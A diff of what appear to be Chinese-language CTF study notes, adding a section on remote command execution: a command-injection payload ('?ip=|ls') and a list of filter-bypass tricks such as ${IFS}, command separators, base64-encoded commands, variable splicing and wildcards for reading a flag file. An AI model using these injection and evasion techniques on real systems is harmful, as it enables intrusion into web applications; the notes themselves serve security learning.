@@ -30,6 +30,7 @@ Progress
 	- [x]  Blacklist
 	- [x]  .htaccess
 - [x]  File Inclusion
+- [x]  RCE
 - [ ]  SSRF
 - [ ]  CSRF
 - [ ]  XSS
@@ -204,3 +205,41 @@ compress.zlib://shell.gz
 ```
 
 php://input需要开启allow_url_include，可以将POST请求中的数据作为PHP代码来执行
+
+# RCE #
+
+## Payload ##
+
+```
+?ip=|ls
+```
+
+## 总结 ##
+
+RCE往往需要进行一系列Bypass
+
+使用 > ${IFS} $IFS$9 来代替空格
+
+使用 & && | || ; %0a 来拼接命令
+
+使用Base64来对命令进行编码
+```
+\`echo aWQ=|base64 -d\`
+```
+
+使用 cat tac head tail more less base64 strings curl grep 来读取文件
+
+使用变量拼接来执行命令
+```
+a=l;b=s;$a$b
+```
+
+使用\来进行bypass
+```
+ca\t /fl\ag
+```
+
+通配符
+```
+cat /fl?*
+```
